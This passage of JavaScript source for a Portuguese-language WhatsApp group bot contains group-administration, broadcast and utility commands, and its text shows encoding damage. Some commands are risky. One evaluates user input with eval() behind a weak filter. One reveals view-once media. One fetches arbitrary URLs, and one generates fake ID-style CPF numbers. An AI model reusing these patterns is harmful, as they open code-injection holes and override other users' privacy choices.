txtin += `\nâ† AnotaÃ§Ã£o: âŸ® ${anotar[i2].puxar[i].nota} âŸ¯ - ã€ˆ ${anotar[i2].puxar[i].anotacao} ã€‰\n`
}
txtin += ""
reply(txtin)
}
break

case 'download-link':
if(q.includes("video") || q.includes("mp4")) {
await yoko.sendMessage(from, {video: {url: q}, mimetype: 'video/mp4'}, {quoted: selo}).catch(async(e) => {
reply("Erro, visualize se este link Ã© vÃ¡lido...")
})
} else if(q.includes("webp") || q.includes("jpg")) {
await yoko.sendMessage(from, {image: {url: q}}, {quoted: selo}).catch(async(e) => {
reply("Erro, visualize se este link Ã© vÃ¡lido...")
})
}
break


case 'verificado-global': 
if(!SoDono) return reply(mess.onlyOwner())
if(!isVerificado) {
nescessario.verificado = true
setNes(nescessario)
reply("O verificado foi desativado com sucesso, ou seja, o selo foi retirado de todos os meus comandos! *Para reativar Ã© sÃ³ digitar o comando novamente.*")
} else if(isVerificado) {
nescessario.verificado = false
setNes(nescessario)
reply(`O verificado foi ativado, ou seja, o selo foi colocado em todos os meus comandos! *Para remover o verificado dos comandos, use o comando novamente.*`) 
}
break

case 'audio-menu': 
if(!SoDono) return reply(mess.onlyOwner())
if(!isAudioMenu) {
nescessario.menu_audio = true
setNes(nescessario)
reply(`O Ã¡udio foi ativado para o menu com sucesso, se quiser desativar Ã© sÃ³ digitar o comando novamente...`)
} else if(isAudioMenu) {
nescessario.menu_audio = false
setNes(nescessario)
reply(`O Ã¡udio foi desativado para o menu com sucesso, se quiser ativar Ã© sÃ³ digitar o comando novamente...`)
}
break


case 'criador': case 'suporte-dono':
reply(`O contato dele caso vocÃª use imune: https://wa.me/5511911942403`)
break

case 'programador':
reagir(from, "ğŸ™…")
audiomenu = await fs.readFileSync("./yoko/bunker/database/data/media/audios/annapv.mp3")
yoko.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
await sleep (10000)
reply(`O contato programador https://wa.me/5511911942403`)
break

case 'configurar-bot':
await yoko.sendMessage(from, {text: getInfo.configbot(prefix)}, {quoted: selo})
break

case 'infoaluguel': case 'inforent': case 'info_aluguel':
await yoko.sendMessage(from, {text: getInfo.infoRent(prefix)}, {quoted: selo})
break

case 'infovip': case 'info_vip':
await yoko.sendMessage(from, {text: getInfo.infoVip(prefix)}, {quoted: selo})
break

case 'infocmdvip': case 'infocmdvip':
await yoko.sendMessage(from, {text: getInfo.infoCmdVip(prefix)}, {quoted: selo})
break

case 'idiomas': case 'idioma':
await yoko.sendMessage(from, {text: getInfo.listLanguages(prefix)}, {quoted: selo})
break

case 'infobv': case 'infowelcome': case 'infobemvindo':
await yoko.sendMessage(from, {text: getInfo.bemvindo(prefix)}, {quoted: selo})
break
case 'destrava':
await yoko.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
break 

case 'perfil':
try {
ppimg = await yoko.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://telegra.ph/file/24fa902ead26340f3df2c.png'
}
try {
var status = (await yoko.fetchStatus(sender)).status
} catch {
var status = "NÃ£o foi possÃ­vel obter a biografia."
}
var conselho = advices.commonAdvices[Math.floor(Math.random() * advices.commonAdvices.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
await yoko.sendMessage(from, {text: mess.profileInformation(pushname, sender, selo, isCargo, isChVip, putar, putar2, gostosurar, gostosurar2, nivelgador, nivelgado2r, programa, status, conselho), contextInfo: {externalAdReply: {title: `ã€˜ğŸ‘¤ã€™ğ’ğ„ğ” ğğ„ğ‘ğ…ğˆğ‹ã€˜ğŸ—¯ï¸ã€™`, body: `â€¢ Confira algumas informaÃ§Ãµes sobre seu perfil..`, thumbnail: await getBuffer(ppimg), mediaType: 2, sourceUrl: `https://wa.me/${sender.split("@")[0]}`}}}, {quoted: selo})
break

case 'tabela':
await yoko.sendMessage(from, {text: tabela(prefix, NomeDoBot)}, {quoted: selo})
break 

case 'destrava2':
await yoko.sendMessage(from, {text: destrava2 (prefix)}, {quoted: selo})
break 



case 'getquoted': 
case 'getinfo': 
case 'get': 
case 'mek':
reply(JSON.stringify(info, null, 3))
break

case 'get-txt':  
reply(JSON.stringify(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation, null, 2))
break

case 'gerarcpf':
cp1 = `${Math.floor(Math.random() * 300) + 600}`
cp2 = `${Math.floor(Math.random() * 300) + 600}`
cp3 = `${Math.floor(Math.random() * 300) + 600}`
cp4 = `${Math.floor(Math.random() * 30) + 60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
await yoko.sendMessage(from, {text: `CPF gerado com sucesso: ${cpf}`}, {quoted: selo})
break

case 'ddd':
if(args.length < 1) return reply(`Use ${prefix + command} 81`)
ddd = body.slice(5)
ddds = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`)
dddlist = `Lista de Cidades de ${ddds.data.state} com este DDD ${q}>\n\n`
for (let i = 0; i < ddds.data.cities.length; i++) { dddlist += `${i + 1} âª§ *${ddds.data.cities[i]}*\n` }
await yoko.sendMessage(from, {text: dddlist}, {quoted: selo})	
break

case 'gethtml':
if(!q || !isUrl(args[0])) return reply(`Modo de uso: ${prefix+command} link do site`)
try {
await replyWithReaction(`âªğŸ‘©ğŸ½â€ğŸ’»ê¦¿ğ™´ğš—ğšŸğš’ğšŠğš—ğšğš˜ ğšğš– ğšœğšğš ğš™ğš›ğš’ğšŸğšŠğšğš˜à½ºâ‰­â€¢ÛŸ.â«`, {react: {text: 'âœ…', key: info.key}});
axios.get(args[0], { headers: {"user-agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36"}}).then(async (res) => {
let htmlData = typeof res.data === 'object' ? JSON.stringify(res.data, null, 2) : res.data
htmlData = htmlData.replace(/Â Â Â  /g, '').replace(/></g, '>\n<').replace(/> </g, '>\n<')
await yoko.sendMessage(sender, {document: Buffer.from(htmlData), fileName: q+`.html`, mimetype: 'text/html'}, {quoted: selo})}).catch(e => {return reply(mess.error())})
} catch (e) {
console.log(e)
reply(mess.error())
}
break

case 'rvisu':
case 'open':
if(!isQuotedVisuU) return reply('Por favor, *mencione uma imagem ou video em visualizaÃ§Ã£o Ãºnica* para executar o comando.')
await reagir(from, "ğŸ‘€");
if(info.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2 || type == "viewOnceMessage") {
if(JSON.stringify(info).includes("videoMessage")) {
var px = info.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage
px.viewOnce = false
px.video = {url: px.url}
px.caption += "\n\nO vÃ­deo em visualizaÃ§Ã£o Ãºnica foi revelado.."
await yoko.sendMessage(from,px)
} else {
var px = info.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage
px.viewOnce = false
px.image = {url: px.url}
px.caption += "\n\nA imagem em visualizaÃ§Ã£o Ãºnica foi revelada.."
await yoko.sendMessage(from,px)
}}
break

//===========(ADMS-FUNÃ‡Ã•ES-AKI)=========\\

case 'calculadora':
case 'calcular':  
case 'calc':
rsp = q.replace("x", "*").replace('"', ":").replace(new RegExp("[()abcdefghijklmnopqrstwuvxyz]", "gi"), "").replace("Ã·", "/")
return reply(JSON.stringify(eval(rsp, null,'\t')))
break 

case 'nomegp':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
blat = args.join(" ")
await yoko.groupUpdateSubject(from, `${blat}`)
await yoko.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo.'}, {quoted: selo})
break

case 'descgp':
case 'descriÃ§Ã£ogp':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyAdmins())
blabla = args.join(" ")
await yoko.groupUpdateDescription(from, `${blabla}`)
await yoko.sendMessage(from, {text: 'Sucesso, alterou a descriÃ§Ã£o do grupo'}, {quoted: selo})
break

case 'setfotogp':
case 'fotogp':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
yoko.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break

case 'linkgp':
case 'linkgroup':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
linkgc = await yoko.groupInviteCode(from)
reply('https://chat.whatsapp.com/'+linkgc)
break

case 'revlinkgp':
case 'revlinkgroup':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
await yoko.groupRevokeInvite(from)
reply(`Link de convite do grupo foi revogado com Ãªxito!`)
break

case 'recrutar':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(!q) return reply("CadÃª o nÃºmero do usuÃ¡rio que vocÃª deseja convidar.")
try {
photoG = await yoko.profilePictureUrl(from, 'image') // Pegar a foto do grupo aonde foi solicitado o comando de recrutamento.
} catch {
photoG = thumbnail // Vai colocar a img que estÃ¡ na definiÃ§Ã£o, caso esteja sem foto.
}
rcrt = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
linkgc = await yoko.groupInviteCode(from)
await yoko.sendMessage(rcrt, {text: "*OlÃ¡, tudo bem?* VocÃª foi convidado(a) pelo(a) adminstrador(a) do grupo.\nPara entrar no grupo, clique acima!", contextInfo: {externalAdReply: {title: "Clique aqui para participar do grupo.", thumbnail: await getBuffer(photoG), mediaType: 1, sourceUrl: "https://chat.whatsapp.com/"+linkgc}}})
reply("Convite de recrutamento do usuÃ¡rio, foi enviado para o privado dele com sucesso...")
break

case 'listatm':
if(!SoDono) return reply(mess.onlyOwner())
rgp = JSON.parse(fs.readFileSync("./yoko/bunker/database/func/tmgroup.json"))
if(rgp.length == 0) return reply(`NÃ£o contÃ©m nenhum registro de transmissÃ£o, utilize ${prefix}rgtm no grupo que deseja que ele receba as transmissÃµes do bot..`)
bl = "";
for ( i = 0; i < rgp.length; i++) {
bl += `( ${i+1} ) - ID: ${rgp[i].id}\nâ€¢ Nome do UsuÃ¡rio(a) ou Grupo: ${rgp[i].infonome}\n-\n`
}
reply(bl)
break

case 'rgtm':
if(!SoDono) return reply(mess.onlyOwner())
rgp = JSON.parse(fs.readFileSync("./yoko/bunker/database/func/tmgroup.json"))
if(JSON.stringify(rgp).includes(from)) return reply("Este grupo/usuÃ¡rio jÃ¡ estÃ¡ registrado na lista de transmissÃ£o") 
rgp.push({id: from, infonome: `${isGroup ? groupName: pushname}`})
fs.writeFileSync("./yoko/bunker/database/func/tmgroup.json", JSON.stringify(rgp))
reply("Registrado com sucesso, quando for realizada as transmissÃµes, esse grupo/usuÃ¡rio estarÃ¡ na lista.")
break

case 'tirardatm':
if(!SoDono) return reply(mess.onlyOwner())
rgp = JSON.parse(fs.readFileSync("./yoko/bunker/database/func/tmgroup.json"))
if(!JSON.stringify(rgp).includes(from)) return reply("Este grupo/usuÃ¡rio nÃ£o estÃ¡ registrado para ser tirado da lista de transmissÃ£o") 
if(q.trim().length > 4) {
var ustm = rgp.map(i => i.id).indexOf(q.trim())
} else {
var ustm = rgp.map(i => i.id).indexOf(from)
}
rgp.splice(ustm, 1)
fs.writeFileSync("./yoko/bunker/database/func/tmgroup.json", JSON.stringify(rgp))
reply("Grupo/UsuÃ¡rio tirado da lista de transmissÃ£o com sucesso")
break

case 'fazertm':
if(!SoDono) return reply(mess.onlyOwner())
var rgp = JSON.parse(fs.readFileSync("./yoko/bunker/database/func/tmgroup.json"))
if(rgp.lengh == 0) return reply("NÃ£o contÃ©m nenhum grupo registrado para realizar transmissÃ£o") 
await sleep(1000);
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var red = isQuotedMsg ? rsm?.textMessage: info.message?.textMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d &&!figu_d && !pink && !blue&& !purple && !yellow? "TransmissÃ£o do ProprietÃ¡rio: "+rsm.conversation: info.message?.conversation
var green = isQuotedMsg2 && !aud_d &&!figu_d && !red && !pink && !blue && !purple && !yellow ? "TransmissÃ£o do ProprietÃ¡rio: "+rsm.extendedTextMessage?.text : info?.message?.extendedTextMessage?.text
if(pink) {
var DFC = pink
pink.caption = q.length > 1 ? "TransmissÃ£o do ProprietÃ¡rio: "+q : pink.caption.replace(new RegExp(prefix+command, "gi"), `TransmissÃ£o do ProprietÃ¡rio: ${ownerName}\n\n`)
pink.image = {url: pink.url}
} else if(blue) {
var DFC = blue  
blue.caption = q.length > 1 ? "TransmissÃ£o do ProprietÃ¡rio: "+q : blue.caption.replace(new RegExp(prefix+command, "gi"), `TransmissÃ£o do ProprietÃ¡rio: ${ownerName}\n\n`)
blue.video = {url: blue.url}
} else if(red) {
black = {}
black.text = red.replace(new RegExp(prefix+command, "gi"), `TransmissÃ£o do ProprietÃ¡rio: ${ownerName}\n\n`)
var DFC = black
} else if(!aud_d && !figu_d && green) {
brown = {}
brown.text = green.replace(new RegExp(prefix+command, "gi"), `TransmissÃ£o do ProprietÃ¡rio: ${ownerName}\n\n`)
var DFC = brown
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url} 
} else if(yellow) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "TransmissÃ£o do ProprietÃ¡rio: "+q : yellow.caption.replace(new RegExp(prefix+command, "gi"), `TransmissÃ£o do ProprietÃ¡rio: ${ownerName}\n\n`)
yellow.document = {url: yellow.url}  
} else if(figu_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
}
for (i = 0; i < rgp.length; i++) {
await yoko.sendMessage(rgp[i].id, DFC)}
break

case 'grupo': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(args.length < 1) return reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}grupo *--help*_`);
groupI = await yoko.groupMetadata(from);
if(args[0] === '--help') return await mention(mess.helpGroupSettings(prefix, sender));
if (args[0] === '-open' || args[0] === 'a') {
if(groupI.announce == false) return reply('O grupo jÃ¡ estÃ¡ aberto, nÃ£o Ã© possÃ­vel solicitar para abrir o que jÃ¡ aberto...');
reply(`Como pedido senhor(a), o grupo foi aberto com sucesso...`)
await yoko.groupSettingUpdate(from, 'not_announcement');
} else if(args[0] === '-close' || args[0] === 'f') {
if(groupI.announce == true) return reply('O grupo jÃ¡ estÃ¡ fechado, nÃ£o Ã© possÃ­vel solicitar para fechar o que jÃ¡ se encontra fechado...');
reply('Como pedido senhor(a), o grupo foi fechado com sucesso...');
await yoko.groupSettingUpdate(from, 'announcement');
} else if(args[0] === '-livre') {
if (groupI.restrict == false) return reply('O grupo nÃ£o possuÃ­ nenhuma restriÃ§Ã£o de alteraÃ§Ã£o nos dados, ou seja, todos podem alterar.');
reply('Como pedido senhor(a), todos os membros tem a permissÃ£o de editar as configuraÃ§Ãµes do grupo.');
await yoko.groupSettingUpdate(from, 'unlocked');
} else if(args[0] === '-private') {
if (groupI.restrict == true) return reply('O grupo jÃ¡ possuÃ­ a restriÃ§Ã£o aos administradores! EntÃ£o, nÃ£o tem como ativar duas vezes.');
reply('Como pedido senhor(a), somente os administradores tem a permissÃ£o de editar os configuraÃ§Ãµes do grupo.');
await yoko.groupSettingUpdate(from, 'locked');
} else {
reply(`ğŸ¤” Hmm, vocÃª parece que estÃ¡ usando de forma errada senhor(a)!\n- Saiba o uso detalhado, atravÃ©s do argumento: _${prefix}grupo *--help*_`);
}
break 

case 'grupoinfo':
case 'infogrupo':
case 'infogp':  
case 'gpinfo':  
case 'regras':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
try {
var ppUrl = await yoko.profilePictureUrl(from, 'image')
} catch {
var ppUrl = `https://telegra.ph/file/6ca032835ed7a16748b6f.jpg`
}
var puxarInfo = await yoko.groupMetadata(from)
var ANC_INFO = puxarInfo.announce
var returnAnnounce = ANC_INFO === false ? "NÃ£o." : ANC_INFO === true ? "Sim." : undefined
var RST_INFO = puxarInfo.restrict 
var returnRestrict = RST_INFO === false ? "Sim." : RST_INFO === true ? "NÃ£o." : undefined
var infoCreator = puxarInfo.subjectOwner || "NÃ£o Encontrado"
infoGroup = `â€¢ Nome do Grupo: *${puxarInfo.subject}*\nâ€¢ ID: *${puxarInfo.id}*\n-\nâ€¢ Este grupo foi criado por: *@${infoCreator.replace("@s.whatsapp.net", "")}*\nâ€¢ Data/hora de criaÃ§Ã£o do grupo: *${moment(`${puxarInfo.creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}*\nâ€¢ HorÃ¡rio e data da Ãºltima alteraÃ§Ã£o no grupo: *${moment(`${puxarInfo.subjectTime}` * 1000).format('DD/MM/YYYY HH:mm:ss')}*\n-\nâ€¢ Quantidade de adminstradores: *${groupAdmins.length}*\nâ€¢ Quantidade de membros: *${somembros.length}*\nâ€¢ Soma total de membros e admins do grupo: *${puxarInfo.participants.length} participantes*\n-\nâ€¢ Este grupo estÃ¡ fechado no momento? *${returnAnnounce}*\nâ€¢ As informaÃ§Ãµes do grupo podem ser alteradas por membros? *${returnRestrict}*\n-\nâ€¢ Para ver as atividades dos participantes, use: *${prefix}atividade*\nâ€¢ Para ver os membros inativos no grupo, use: *${prefix}inativos [quantidade de mensagens]*, ex: ${prefix}inativos 10`
await yoko.sendMessage(from, {image: {url: ppUrl}, caption: infoGroup, mentions: [infoCreator]}, {quoted: selo})
break 

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
var DFC = "";
var rsm = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var pink = isQuotedImage ? rsm?.imageMessage: info.message?.imageMessage
var blue = isQuotedVideo ? rsm?.videoMessage: info.message?.videoMessage
var purple = isQuotedDocument ? rsm?.documentMessage: info.message?.documentMessage
var yellow = isQuotedDocW ? rsm?.documentWithCaptionMessage?.message?.documentMessage: info.message?.documentWithCaptionMessage?.message?.documentMessage
var aud_d = isQuotedAudio ? rsm.audioMessage : ""
var figu_d = isQuotedSticker ? rsm.stickerMessage : ""
var red = isQuotedMsg && !aud_d && !figu_d && !pink && !blue&& !purple && !yellow? rsm.conversation: info.message?.conversation
var green = rsm?.extendedTextMessage?.text || info?.message?.extendedTextMessage?.text
var MRC_TD = groupMembers.map(i => i.id)
if(pink && !aud_d && !purple) {
var DFC = pink
pink.caption = q.length > 1 ? "âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* "+q :pink.caption.replace(new RegExp(prefix+command, "gi"), `âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* ${pushname}\n\n`)
pink.image = {url: pink.url}
pink.mentions = MRC_TD
} else if(blue && !aud_d && !purple) {
var DFC = blue  
blue.caption = q.length > 1 ? "âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* "+q.trim() :blue.caption.replace(new RegExp(prefix+command, "gi"), `âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* ${pushname}\n\n`).trim()
blue.video = {url: blue.url}
blue.mentions = MRC_TD
} else if(red && !aud_d && !purple) {
black = {}
black.text = red.replace(new RegExp(prefix+command, "gi"), `âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* ${pushname}\n\n`).trim()
black.mentions = MRC_TD
var DFC = black
} else if(!aud_d && !figu_d && green && !purple && !purple) {
brown = {}
brown.text = green.replace(new RegExp(prefix+command, "gi"), `âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* ${pushname}\n\n`).trim()
brown.mentions = MRC_TD
var DFC = brown
} else if(purple) {
var DFC = purple
purple.document = {url: purple.url}
purple.mentions = MRC_TD
} else if(yellow && !aud_d) {
var DFC = yellow 
yellow.caption = q.length > 1 ? "âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* "+q.trim() :yellow.caption.replace(new RegExp(prefix+command, "gi"), `âªğŸ‘‘à¸ºà£ªà£­Í˜ê•¸â–¸ *MarcaÃ§Ã£o do(a) Adm:* ${pushname}\n\n`).trim()
yellow.document = {url: yellow.url}
yellow.mentions = MRC_TD
} else if(figu_d && !aud_d) {
var DFC = figu_d
figu_d.sticker = {url: figu_d.url}
figu_d.mentions = MRC_TD
} else if(aud_d) {
var DFC = aud_d
aud_d.audio = {url: aud_d.url}
aud_d.mentions = MRC_TD
aud_d.ptt = true
}
await yoko.sendMessage(from, DFC).catch((error) => {})
break

case 'marcar':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
async function marcac() {
bla = []
blad = `â€¢ Mencionando os membros comuns do grupo ou de uma comunidade. ${!q ? "" : `\n*Mensagem:* ${q}`}\n\n`
for( let i of somembros ) {
blad += `Â» @${i.split("@")[0]}\n`
bla.push(i)
}
blam = JSON.stringify(somembros)
if(blam.length == 2) return reply(`âŒï¸ OlÃ¡ *${pushname}* - NÃ£o contÃ©m nenhum membro comum no grupo, Ã© sim apenas administradores. `)
await mentions(blad, bla, true)  
}
marcac().catch((error) => {
console.log(error)
})
break

case 'marcar2':
try {
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())  
if(q.includes(`${prefix}`)) return reply("NÃ£o pode utilizar comandos nesse comando.")
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += ''
for (let mem of groupMembers) {
teks += `â• â¥ @${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
reply(teks)
} catch {
reply('Erro ao mencionar.')
}
break

case 'marcarwa':
try {
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())  
if(q.includes(`${prefix}`)) return reply("NÃ£o pode utilizar comandos nesse comando")
members_id = []
teks = (args.length > 1) ? body.slice(10).trim() : ''
teks += ''
for (let mem of groupMembers) {
teks += `â• â¥ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
await yoko.sendMessage(from, {text: teks}, {quoted: selo})
} catch {
reply('Erro ao mencionar.')
}
break

case 'reviverqr':
if(!SoDono) return reply(mess.onlyOwner())
exec(`cd ${qrcode} && rm -rf pre-key* sender* session*`)
setTimeout(async () => {
    await reply("Reiniciando...")
 setTimeout(async () => {
    process.exit()
 }, 1200)
}, 1000)
break

case 'ptvmsg':
if (!isQuotedVideo && !info.message.videoMessage) return reply('Marque um vÃ­deo/gif que vocÃª deseja converter para mensagem de vÃ­deo.');
await yoko.relayMessage(from, {ptvMessage: isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage }, {})
break

case 'reviver':
if(!isGroup) return reply(mess.onlyGroup())
if(!SoDono) return reply(mess.onlyOwner())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque uma mensagem do alvo!')
await sleep(5000)
response2 = await yoko.groupParticipantsUpdate(from, [menc_prt], "add" )
reply('Usuario adicionado de volta ao grupo.')
break

case 'sairgp':
if(isGroup && !SoDono && !info.key.fromMe) return reply("Este comando sÃ³ o bot ou o dono pode executar..")
try {
await yoko.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break

case 'cronometro'://vncs & nunu
if(!SoDono) return reply(mess.onlyOwner());
    async function CronZ(txt, timeArg) {
        let totalTime = parseInt(timeArg, 10) * 60;
        if (isNaN(totalTime) || totalTime > 60) totalTime = 60;
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }//vncs & nunu
        const startMsg = `â³ *CronÃ´metro Iniciado* â³\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}*Tempo Restante: ${Math.floor(totalTime / 60)}:00*`;
        let { key } = await yoko.sendMessage(from, { text: startMsg }, { quoted: info });
//vncs & nunu
        const progressBarLength = 20;
//vncs & nunu
        for (let i = totalTime - 1; i >= 0; i--) {
            const minutes = Math.floor(i / 60);
            const seconds = i % 60;
            const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            const progress = Math.floor(((totalTime - i) / totalTime) * progressBarLength);
            const progressBar = `[${'â–ˆ'.repeat(progress)}${'â–‘'.repeat(progressBarLength - progress)}]`;

            await sleep(1000);

            const updateMsg = `â³ *CronÃ´metro* â³\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}> *Tempo Restante:* ${timeString}\n${progressBar}`;
            await yoko.sendMessage(from, { text: updateMsg, edit: key }, { quoted: info });
        }

        const endMsg = `âœ… *Tempo Esgotado!* âœ…\n\n${txt.length > 0 ? `*Mensagem:* ${txt}\n\n` : ''}*O tempo especificado terminou.*`;
        await yoko.sendMessage(from, { text: endMsg }, { quoted: info });
    }
    const txt = args.slice(1).join(' ');
    const timeArg = args[0];
    CronZ(txt, timeArg);
    break;

case 'seradm':
if(!SoDono) return reply(mess.onlyOwner());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
await mentions(`@${sender.split("@")[0]} Pronto - Agora vocÃª Ã© um administrador..`, [sender], true)
await yoko.groupParticipantsUpdate(from, [sender], "promote");
break

case 'sermembro':
if(!SoDono) return reply(mess.onlyOwner());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
await mentions(`@${sender.split("@")[0]} Pronto - Agora vocÃª Ã© um membro comum novamente..`, [sender], true)
await yoko.groupParticipantsUpdate(from, [sender], "demote")
break

case 'advertir':
case 'adverter': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(menc_os2 == botNumber) return reply("NÃ£o pode advertir o prÃ³prio bot.");
if(menc_os2 == nmrdn) return reply("NÃ£o pode advertir o prÃ³prio dono do bot.");
if(groupAdmins.includes(menc_os2)) return reply("NÃ£o Ã© possÃ­vel advertir adminstrador do grupo.");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("NÃ£o tem como advertir um usuÃ¡rio que nÃ£o se encontra mais no grupo.")
ADVT.push(menc_os2); setGp(dataGp)  
setTimeout(async() => {
var dfqn = ADVT.filter(x => x == menc_os2).length
var dfntxt = mess.warningAdvertencia(menc_os2, dfqn)
if(!dfntxt.includes("3/3")) {
if(!JSON.stringify(ADVT).includes(sender)) {
await sleep(1500); 
await mentions(dfntxt, [menc_os2])
} else if(dfqn == 2) {
await sleep(1500); 
await mentions(dfntxt, [menc_os2])
}} else {
await yoko.sendMessage(from, {text: mess.finishAdvertencia(menc_os2), mentions: [menc_os2]}, {quoted: selo})
await sleep(1500)
await yoko.groupParticipantsUpdate(from, [menc_os2], "remove")
var i = ADVT.indexOf(menc_os2); 
ADVT.splice(i, 3); setGp(dataGp)}}, 3000)
break

case 'rmadv':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
